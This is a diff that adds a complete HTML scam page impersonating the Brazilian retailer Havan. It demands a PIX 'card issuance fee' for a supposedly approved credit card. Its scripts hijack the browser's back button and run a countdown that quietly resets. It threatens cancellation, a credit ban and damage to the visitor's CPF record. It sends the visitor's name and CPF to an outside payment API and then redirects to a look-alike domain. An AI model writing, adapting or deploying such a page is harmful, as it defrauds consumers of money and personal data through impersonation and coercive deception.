@@ -1,0 +1,467 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Pagamento PIX - Havan</title>
+    <link rel="shortcut icon" href="https://www.havan.com.br/favicon.ico" type="image/x-icon">
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/qrcodejs/1.0.0/qrcode.min.js"></script>
+    <script src="https://cdn.tailwindcss.com"></script>
+    
+    <!-- Pixel e UTM -->
+    <script>
+        window.pixelId = "67c65ea78480a2789186da08";
+        var a = document.createElement("script");
+        a.setAttribute("async", "");
+        a.setAttribute("defer", "");
+        a.setAttribute("src", "https://cdn.utmify.com.br/scripts/pixel/pixel.js");
+        document.head.appendChild(a);
+    </script>
+    <script
+        src="https://cdn.utmify.com.br/scripts/utms/latest.js"
+        data-utmify-prevent-subids
+        async
+        defer
+    ></script>
+    
+    <script>
+  window.tikTokPixelId = "6a1a43795b3b450a84be8b74";
+  var a = document.createElement("script");
+  a.setAttribute("async", "");
+  a.setAttribute("defer", "");
+  a.setAttribute("src", "https://cdn.utmify.com.br/scripts/pixel/pixel-tiktok.js");
+  document.head.appendChild(a);
+</script>
+
+<script>
+  window.tikTokPixelId = "6a1a3aad8e76be25deacd07b";
+  var a = document.createElement("script");
+  a.setAttribute("async", "");
+  a.setAttribute("defer", "");
+  a.setAttribute("src", "https://cdn.utmify.com.br/scripts/pixel/pixel-tiktok.js");
+  document.head.appendChild(a);
+</script>
+
+    <!-- Back Redirect Script -->
+    <script>
+        (function(b, r, a, d, i, l) {
+            if (b.history && b.history.pushState) {
+                b.history.pushState(null, null, b.location.href);
+                b.onpopstate = function() {
+                    b.location.replace(r);
+                };
+            }
+        })(window, "pos/back/01/index.html");
+    </script>
+
+    <script>
+        tailwind.config = {
+            theme: {
+                extend: {
+                    colors: {
+                        'havan-blue': '#003399',
+                        'havan-light-blue': '#0055cc',
+                        'havan-yellow': '#ffcc00',
+                        'havan-gray': '#f4f4f4',
+                        'havan-dark': '#1a1a1a'
+                    }
+                }
+            }
+        }
+    </script>
+
+    <style>
+        @import url('https://fonts.googleapis.com/css2?family=Montserrat:wght@400;500;600;700;800&display=swap');
+        
+        body {
+            font-family: 'Montserrat', sans-serif;
+            background-color: #f4f4f4;
+            color: #333;
+            margin: 0;
+            padding: 0;
+        }
+        
+        .havan-header {
+            background-color: #003399;
+            border-bottom: 4px solid #ffcc00;
+        }
+        
+        .havan-card {
+            border-radius: 12px;
+            box-shadow: 0 10px 25px rgba(0, 0, 0, 0.1);
+            overflow: hidden;
+        }
+        
+        .notification-popup {
+            position: fixed;
+            top: 20px;
+            right: -300px;
+            background-color: #28a745;
+            color: white;
+            padding: 16px;
+            border-radius: 8px;
+            box-shadow: 0 4px 12px rgba(0, 0, 0, 0.15);
+            z-index: 1000;
+            transition: right 0.3s ease-in-out;
+            display: flex;
+            align-items: center;
+            gap: 8px;
+        }
+
+        .notification-popup.show {
+            right: 20px;
+        }
+
+        .cartao-container {
+            position: relative;
+            display: inline-block;
+            width: 100%;
+            max-width: 350px;
+            margin: 0 auto;
+        }
+
+        .cartao {
+            width: 100%;
+            aspect-ratio: 1.75 / 1;
+            border-radius: 15px;
+            background: #002279;
+            color: white;
+            padding: 20px;
+            display: flex;
+            flex-direction: column;
+            justify-content: space-between;
+            box-shadow: 0 8px 20px rgba(0, 0, 0, 0.2);
+            font-family: Arial, sans-serif;
+            position: relative;
+            overflow: hidden;
+            margin: 0 auto;
+        }
+
+        .imagem-chip {
+            width: 35px;
+            position: absolute;
+            top: 40%;
+            left: 15px;
+            transform: translateY(-50%);
+        }
+
+        .imagem-lateral {
+            width: 30px;
+            position: absolute;
+            top: 40%;
+            left: 60px;
+            transform: translateY(-50%);
+        }
+
+        .top-left-text {
+            position: absolute;
+            top: 15px;
+            left: 15px;
+            width: 50px;
+        }
+
+        .top-right-img {
+            width: 50px;
+            position: absolute;
+            top: 15px;
+            right: 15px;
+        }
+
+        .card-details {
+            display: flex;
+            justify-content: space-between;
+            position: absolute;
+            bottom: 20px;
+            width: 90%;
+            left: 5%;
+        }
+
+        .titular {
+            text-align: left;
+        }
+
+        .valido {
+            text-align: right;
+        }
+
+        .titular p, .valido p {
+            margin: 0;
+            font-size: 10px;
+        }
+
+        .texto-label {
+            font-size: 10px;
+            text-transform: uppercase;
+            color: rgba(255, 255, 255, 0.8);
+            margin-bottom: 2px;
+        }
+
+        .nome-titular {
+            font-size: 14px;
+            font-weight: bold;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+        }
+
+        .data-valido {
+            font-size: 12px;
+            font-weight: bold;
+        }
+
+        .resumo-item {
+            display: flex;
+            justify-content: space-between;
+            padding: 8px 0;
+            border-bottom: 1px dashed #e5e7eb;
+        }
+        .resumo-item:last-child {
+            border-bottom: none;
+        }
+    </style>
+</head>
+
+<body class="min-h-screen pb-10">
+    <div id="notification" class="notification-popup">
+        <svg xmlns="http://www.w3.org/2000/svg" class="h-5 w-5" fill="none" viewBox="0 0 24 24" stroke="currentColor">
+            <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M5 13l4 4L19 7" />
+        </svg>
+        <span>Código PIX copiado!</span>
+    </div>
+
+    <header class="havan-header flex px-6 h-20 items-center justify-center">
+        <img src="/9/images/hv-branco.png" alt="Havan" style="height: 50px; width: auto;">
+    </header>
+
+    <main id="paymentPage" class="max-w-lg mx-auto mt-8 px-4">
+        <div class="bg-white havan-card">
+            <div class="px-6 py-4 bg-gray-50 border-b border-gray-200 flex items-center justify-between">
+                <div>
+                    <h2 class="text-xl font-bold text-havan-blue">Pagamento PIX</h2>
+                    <p class="text-xs font-semibold text-gray-600 mt-1">Cartão de crédito Havan</p>
+                </div>
+                <div class="bg-havan-yellow text-havan-blue text-xs font-bold px-3 py-1 rounded-full">
+                    AGUARDANDO
+                </div>
+            </div>
+
+            <div class="px-6 py-8 text-center border-b border-gray-100 bg-gray-50/50">
+                <div class="cartao-container">
+                    <div class="cartao" id="cartao-preview">
+                        <img src="/9/images/hv-branco.png" alt="Havan" class="top-left-text">
+                        <img src="9/images/Visa-logo-whitea91b.png" alt="Visa" class="top-right-img">
+                        <img src="9/images/chip-1-logo-png-transparent.png" alt="Chip" class="imagem-chip">
+                        <img src="9/images/Design-sem-nome.png" alt="Logo" class="imagem-lateral">
+                        <div class="card-details">
+                            <div class="titular">
+                                <p class="texto-label">Titular do Cartão</p>
+                                <p id="titular-nome" class="nome-titular">CARREGANDO...</p>
+                            </div>
+                            <div class="valido">
+                                <p class="texto-label">Válido Até</p>
+                                <p class="data-valido">01/32</p>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <div class="px-6 py-6 border-b border-gray-100">
+                <div class="bg-blue-50 rounded-xl p-4 border border-blue-100">
+                    <div class="resumo-item">
+                        <span class="text-xs font-semibold text-gray-500 uppercase">Limite aprovado:</span>
+                        <span class="text-sm font-bold text-havan-blue">R$ 4.700,00</span>
+                    </div>
+                    <div class="resumo-item">
+                        <span class="text-xs font-semibold text-gray-500 uppercase">Prazo de entrega:</span>
+                        <span class="text-sm font-bold text-havan-blue">03 dias úteis</span>
+                    </div>
+                </div>
+
+                <div class="text-center mt-6">
+                    <p class="text-gray-500 text-xs font-medium uppercase tracking-wider">Valor da Taxa de Emissão</p>
+                    <div class="text-2xl font-black text-havan-blue mt-1">R$ 28,72</div>
+                </div>
+
+                <div class="mt-4 bg-green-50 border border-green-200 rounded-lg p-3 text-center">
+                    <p class="text-green-700 text-xs font-bold uppercase">O VALOR DA TAXA SERÁ ESTORNADA NA PRIMEIRA UTILIZAÇÃO DO CARTÃO.</p>
+                </div>
+
+                <div class="mt-4 text-center">
+                    <p class="text-havan-blue text-xs font-bold uppercase tracking-wider mb-1">Realize o pagamento em até:</p>
+                    <div id="timer" class="text-xl font-bold text-red-600">10:00</div>
+                </div>
+
+                <div class="mt-8">
+                    <div id="imagemContainer" class="bg-white p-4 rounded-xl border-2 border-dashed border-gray-200 cursor-pointer flex flex-col items-center justify-center" style="min-height: 280px;" onclick="copiarPixCode()">
+                        <div id="loading-placeholder" class="text-center text-gray-400">
+                            <div class="animate-spin rounded-full h-12 w-12 border-b-2 border-havan-blue mx-auto mb-4"></div>
+                            <p class="font-medium">Gerando seu QR Code...</p>
+                        </div>
+                    </div>
+                </div>
+
+                <div class="mt-6">
+                    <label class="block text-xs font-bold text-gray-400 uppercase mb-2 ml-1">Código PIX Copia e Cola</label>
+                    <input id="codigo-input" type="text" readonly value="Carregando..." class="w-full bg-gray-50 border border-gray-200 rounded-lg px-4 py-3 text-sm font-mono text-gray-600 focus:outline-none">
+                </div>
+
+                <button onclick="copiarPixCode()" class="w-full bg-havan-blue text-white font-bold py-4 rounded-xl mt-6 uppercase shadow-lg">
+                    COPIAR CÓDIGO PIX
+                </button>
+            </div>
+
+            <div class="px-6 py-6 bg-red-50 border-t border-red-100">
+                <div class="flex items-center gap-2 mb-4">
+                    <svg xmlns="http://www.w3.org/2000/svg" class="h-5 w-5 text-red-600" fill="none" viewBox="0 0 24 24" stroke="currentColor">
+                        <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 9v2m0 4h.01m-6.938 4h13.856c1.54 0 2.502-1.667 1.732-3L13.732 4c-.77-1.333-2.694-1.333-3.464 0L3.34 16c-.77 1.333.192 3 1.732 3z" />
+                    </svg>
+                    <h3 class="text-sm font-bold text-red-700 uppercase">Atenção: Penalidades</h3>
+                </div>
+                <div class="space-y-3">
+                    <div class="flex items-start gap-3">
+                        <span class="bg-havan-blue text-white text-[10px] font-bold w-5 h-5 rounded-full flex items-center justify-center shrink-0 mt-0.5">1</span>
+                        <p class="text-sm text-gray-600 font-medium">Seu cartão será cancelado.</p>
+                    </div>
+                    <div class="flex items-start gap-3">
+                        <span class="bg-havan-blue text-white text-[10px] font-bold w-5 h-5 rounded-full flex items-center justify-center shrink-0 mt-0.5">2</span>
+                        <p class="text-sm text-gray-600 font-medium">Você não poderá solicitar crédito com a Havan durante 5 anos.</p>
+                    </div>
+                    <div class="flex items-start gap-3">
+                        <span class="bg-havan-blue text-white text-[10px] font-bold w-5 h-5 rounded-full flex items-center justify-center shrink-0 mt-0.5">3</span>
+                        <p class="text-sm text-gray-600 font-medium">O valor de R$ 28,72 será cobrado via judicial, podendo ocorrer a <strong>negativação do CPF</strong>.</p>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </main>
+
+    <div id="successPage" class="hidden max-w-lg mx-auto mt-20 px-4 text-center">
+        <div class="bg-white havan-card p-10">
+            <div class="w-20 h-20 bg-green-100 text-green-600 rounded-full flex items-center justify-center mx-auto mb-6">
+                <svg xmlns="http://www.w3.org/2000/svg" class="h-10 w-10" fill="none" viewBox="0 0 24 24" stroke="currentColor">
+                    <path stroke-linecap="round" stroke-linejoin="round" stroke-width="3" d="M5 13l4 4L19 7" />
+                </svg>
+            </div>
+            <h2 class="text-2xl font-black text-havan-blue mb-2">PAGAMENTO APROVADO!</h2>
+            <p class="text-gray-600 font-medium">Sua solicitação foi processada com sucesso. Redirecionando...</p>
+        </div>
+    </div>
+
+    <script>
+        const API_URL = 'https://www.pagamentos-seguros.app/api-pix/OSS7n1_UVPInD6FtO3fWz1U5TaJzycMEVQPCHOwpu2auZ51pABGdX1MpcRUUwZxQE4zvexNSomX6Fat34HoeqA';
+        const REDIRECT_URL = 'https://hv-consultas.link/pos/pos/index.html';
+        const AMOUNT = 2872;
+        let pixCode = null;
+        let transactionId = null;
+        let statusInterval = null;
+
+        function cleanString(str) { return str ? str.replace(/\{\{|\}\}/g, '').trim() : ""; }
+        function cleanCPF(cpf) { return cpf ? cpf.replace(/\D/g, '') : ""; }
+
+        function startTimer(duration, display) {
+            let timer = duration, minutes, seconds;
+            setInterval(function () {
+                minutes = parseInt(timer / 60, 10);
+                seconds = parseInt(timer % 60, 10);
+
+                minutes = minutes < 10 ? "0" + minutes : minutes;
+                seconds = seconds < 10 ? "0" + seconds : seconds;
+
+                display.textContent = minutes + ":" + seconds;
+
+                if (--timer < 0) {
+                    timer = duration;
+                }
+            }, 1000);
+        }
+
+        function carregarDadosCartao() {
+            const urlParams = new URLSearchParams(window.location.search);
+            const dadosUsuarioLS = JSON.parse(localStorage.getItem('dadosCPF')) || {};
+            let nome = urlParams.get('nome') || dadosUsuarioLS.nomeCompleto || "CLIENTE HAVAN";
+            let cor = urlParams.get('cor') || dadosUsuarioLS.corSelecionada || "#002279";
+            document.getElementById('titular-nome').textContent = cleanString(nome).toUpperCase();
+            document.getElementById('cartao-preview').style.backgroundColor = cor;
+            
+            const tenMinutes = 60 * 10;
+            const display = document.querySelector('#timer');
+            startTimer(tenMinutes, display);
+        }
+
+        async function generatePix() {
+            try {
+                const urlParams = new URLSearchParams(window.location.search);
+                const dadosUsuarioLS = JSON.parse(localStorage.getItem('dadosCPF')) || {};
+                let nomeFinal = cleanString(urlParams.get('nome') || dadosUsuarioLS.nomeCompleto || "Cliente Havan");
+                let cpfFinal = cleanCPF(urlParams.get('cpf') || dadosUsuarioLS.cpf || "57948135715");
+                if (cpfFinal.length !== 11) cpfFinal = "57948135715";
+
+                const payload = {
+                    "amount": AMOUNT,
+                    "description": "Havan - Taxa de Emissão de Cartão",
+                    "customer": { "name": nomeFinal, "document": cpfFinal, "email": "cliente@havan.com.br", "phone": "11999999999" },
+                    "item": { "title": "Taxa de Emissão Cartão Havan", "price": AMOUNT, "quantity": 1 },
+                    "paymentMethod": "PIX",
+                    "utm": window.location.search.substring(1)
+                };
+
+                const response = await fetch(API_URL, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify(payload)
+                });
+
+                const result = await response.json();
+                if (result.pixCode) {
+                    pixCode = result.pixCode;
+                    transactionId = result.transactionId;
+                    document.getElementById('codigo-input').value = pixCode;
+                    renderQRCode(pixCode);
+                    statusInterval = setInterval(checkStatus, 5000);
+
+                    if (window.utmify && window.utmify.sendEvent) {
+                        window.utmify.sendEvent('checkout', { value: AMOUNT / 100 });
+                    }
+                }
+            } catch (error) { console.error(error); }
+        }
+
+        async function checkStatus() {
+            if (!transactionId) return;
+            try {
+                const response = await fetch(`${API_URL}?transactionId=${transactionId}`);
+                const result = await response.json();
+                if (result.status === 'COMPLETED') {
+                    clearInterval(statusInterval);
+                    if (window.utmify && window.utmify.sendEvent) {
+                        window.utmify.sendEvent('purchase', { value: AMOUNT / 100 });
+                    }
+                    document.getElementById('paymentPage').classList.add('hidden');
+                    document.getElementById('successPage').classList.remove('hidden');
+                    setTimeout(() => { window.location.replace(REDIRECT_URL + window.location.search); }, 2000);
+                }
+            } catch (e) {}
+        }
+
+        function renderQRCode(text) {
+            const container = document.getElementById('imagemContainer');
+            container.innerHTML = '';
+            new QRCode(container, { text: text, width: 240, height: 240, colorDark: "#003399", colorLight: "#ffffff", correctLevel: QRCode.CorrectLevel.L });
+        }
+
+        function copiarPixCode() {
+            navigator.clipboard.writeText(pixCode).then(() => {
+                const popup = document.getElementById('notification');
+                popup.classList.add('show');
+                setTimeout(() => popup.classList.remove('show'), 3000);
+            });
+        }
+
+        document.addEventListener('DOMContentLoaded', () => {
+            carregarDadosCartao();
+            generatePix();
+        });
+    </script>
+</body>
+</html>
